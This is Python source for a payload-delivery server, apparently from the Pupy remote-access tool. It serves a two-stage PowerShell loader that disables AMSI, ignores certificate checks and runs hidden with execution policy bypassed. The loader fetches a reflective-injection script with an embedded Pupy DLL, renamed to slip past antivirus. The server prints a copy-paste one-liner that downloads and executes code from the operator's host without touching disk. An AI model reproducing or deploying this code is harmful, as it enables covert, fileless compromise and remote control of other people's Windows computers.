#!/usr/bin/env python
# -*- coding: UTF8 -*-
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
import os.path
from pupylib.utils.term import colorize
import random, string
from pupygen import get_edit_pupyx86_dll
try:
    import ConfigParser as configparser
except ImportError:
    import configparser
from ssl import wrap_socket
from base64 import b64encode
import re

from modules.lib.windows.powershell_upload import obfuscatePowershellScript, obfs_ps_script

ROOT=os.path.abspath(os.path.join(os.path.dirname(__file__),"..",".."))

#url_random_one = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(5))
#url_random_two = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(5))

### "url_random_one" and "url_random_two" variables are fixed because if you break you ps1_listener listener, the ps1_listener payload will not be able to get stages -:(
url_random_one = "eiloShaegae1"
url_random_two = "IMo8oosieVai"

def getInvokeReflectivePEInjectionWithDLLEmbedded(payload_conf):
    '''
    Return source code of InvokeReflectivePEInjection.ps1 script with pupy dll embedded
    Ready for executing
    '''
    SPLIT_SIZE = 100000
    x86InitCode, x86ConcatCode = "", ""
    code = """
    $PEBytes = ""
    {0}
    $PEBytesTotal = [System.Convert]::FromBase64String({1})
    Invoke-ReflectivePEInjection -PEBytes $PEBytesTotal -ForceASLR
    """#{1}=x86dll
    binaryX86=b64encode(get_edit_pupyx86_dll(payload_conf))
    binaryX86parts = [binaryX86[i:i+SPLIT_SIZE] for i in range(0, len(binaryX86), SPLIT_SIZE)]
    for i,aPart in enumerate(binaryX86parts):
        x86InitCode += "$PEBytes{0}=\"{1}\"\n".format(i,aPart)
        x86ConcatCode += "$PEBytes{0}+".format(i)
    print(colorize("[+] ","green")+"X86 pupy dll loaded and {0} variables generated".format(i+1))
    script = obfuscatePowershellScript(open(os.path.join(ROOT, "external", "PowerSploit", "CodeExecution", "Invoke-ReflectivePEInjection.ps1"), 'r').read())
    return obfs_ps_script("{0}\n{1}".format(script, code.format(x86InitCode, x86ConcatCode[:-1])))

def create_ps_command(ps_command, force_ps32=False, nothidden=False):
    ps_command = """[Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}};
    try{{ 
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)
    }}catch{{}}
    {}
    """.format(ps_command)

    if force_ps32:
        command = """$command = '{}'
        if ($Env:PROCESSOR_ARCHITECTURE -eq 'AMD64') 
        {{
            
            $exec = $Env:windir + '\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -exec bypass -window hidden -noni -nop -encoded ' + $command
            IEX $exec
        }}
        else
        {{
            $exec = [System.Convert]::FromBase64String($command)
            $exec = [Text.Encoding]::Unicode.GetString($exec)
            IEX $exec
        }}""".format(b64encode(ps_command.encode('UTF-16LE')))
        
        if nothidden is True:
            command = 'powershell.exe -exec bypass -window maximized -encoded {}'.format(b64encode(command.encode('UTF-16LE')))
        else:
            command = 'powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(b64encode(command.encode('UTF-16LE')))

    elif not force_ps32:
        if nothidden is True:
            command = 'powershell.exe -exec bypass -window maximized -encoded {}'.format(b64encode(ps_command.encode('UTF-16LE')))
        else:
            command = 'powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(b64encode(ps_command.encode('UTF-16LE')))

    return command

class PupyPayloadHTTPHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # print self.server.random_reflectivepeinj_name
        if self.path=="/%s" % url_random_one:
            self.send_response(200)
            self.send_header('Content-type','text/html')
            self.end_headers()
            if self.server.useTargetProxy == True:
                print colorize("[+] ","green")+"Stage 1 configured for using target's proxy configuration"
                launcher = """IEX (New-Object Net.WebClient).DownloadString('http://{server}:{port}/{url_random_two}');""".format(  
                                                                                server=self.server.link_ip,
                                                                                port=self.server.link_port,
                                                                                url_random_two=url_random_two
                                                                            )
            else:
                print colorize("[+] ","green")+"Stage 1 configured for NOT using target's proxy configuration"
                launcher = """$w=(New-Object System.Net.WebClient);$w.Proxy=[System.Net.GlobalProxySelection]::GetEmptyWebProxy();iex($w.DownloadString('http://{server}:{port}/{url_random_two}'));""".format(  
                                                                                server=self.server.link_ip,
                                                                                port=self.server.link_port,
                                                                                url_random_two=url_random_two
                                                                            )
            launcher = create_ps_command(launcher, force_ps32=True, nothidden=False)
            self.wfile.write(launcher)
            print colorize("[+] ","green")+"[Stage 1/2] Powershell script served !"
        
        elif self.path=="/%s" % url_random_two:
            self.send_response(200)
            self.send_header('Content-type','application/octet-stream')
            self.end_headers()
            code=open(os.path.join(ROOT, "external", "PowerSploit", "CodeExecution", "Invoke-ReflectivePEInjection.ps1"), 'r').read()
            code=code.replace("Invoke-ReflectivePEInjection", self.server.random_reflectivepeinj_name) # seems to bypass some av like avast :o)
            self.wfile.write(getInvokeReflectivePEInjectionWithDLLEmbedded(self.server.payload_conf))
            print colorize("[+] ","green")+"[Stage 2/2] Powershell Invoke-ReflectivePEInjection script (with dll embedded) served!"
            print colorize("[+] ","green")+"You should have a pupy shell in few seconds from this host..."

        else:
            self.send_response(404)
            self.end_headers()
            return

class ps1_HTTPServer(HTTPServer):
    def __init__(self, server_address, conf, link_ip, link_port, ssl, useTargetProxy):
        self.payload_conf = conf
        self.link_ip=link_ip
        self.link_port=link_port
        self.random_reflectivepeinj_name=''.join([random.choice(string.ascii_lowercase+string.ascii_uppercase+string.digits) for _ in range(0,random.randint(8,12))])
        self.useTargetProxy = useTargetProxy
        HTTPServer.__init__(self, server_address, PupyPayloadHTTPHandler)
        if ssl:
            config = configparser.ConfigParser()
            config.read("pupy.conf")
            keyfile=config.get("pupyd","keyfile").replace("\\",os.sep).replace("/",os.sep)
            certfile=config.get("pupyd","certfile").replace("\\",os.sep).replace("/",os.sep)
            self.socket = wrap_socket (self.socket, certfile=certfile, keyfile=keyfile, server_side=True)

def serve_ps1_payload(conf, ip="0.0.0.0", port=8080, link_ip="<your_ip>", ssl=False, useTargetProxy=True):
    try:
        try:
            server = ps1_HTTPServer((ip, port), conf, link_ip, port, ssl, useTargetProxy)
        except Exception as e:
            # [Errno 98] Adress already in use
            raise

        print colorize("[+] ","green")+"copy/paste this one-line loader to deploy pupy without writing on the disk :"
        print " --- "
        if useTargetProxy == True:
            oneliner=colorize("powershell.exe -w hidden -noni -nop -c \"iex(New-Object System.Net.WebClient).DownloadString('http://%s:%s/%s')\""%(link_ip, port, url_random_one), "green")
            message=colorize("Please note that if the target's system uses a proxy, this previous powershell command will download/execute pupy through the proxy", "yellow")
        else:
            oneliner=colorize("powershell.exe -w hidden -noni -nop -c \"$w=(New-Object System.Net.WebClient);$w.Proxy=[System.Net.GlobalProxySelection]::GetEmptyWebProxy();iex($w.DownloadString('http://%s:%s/%s'));\""%(link_ip, port, url_random_one), "green")
            message= colorize("Please note that even if the target's system uses a proxy, this previous powershell command will not use the proxy for downloading pupy", "yellow")
        print oneliner
        print " --- "
        print message
        print " --- "

        print colorize("[+] ","green")+'Started http server on %s:%s '%(ip, port)
        print colorize("[+] ","green")+'waiting for a connection ...'
        server.serve_forever()
    except KeyboardInterrupt:
        print 'KeyboardInterrupt received, shutting down the web server'
        server.socket.close()
        exit()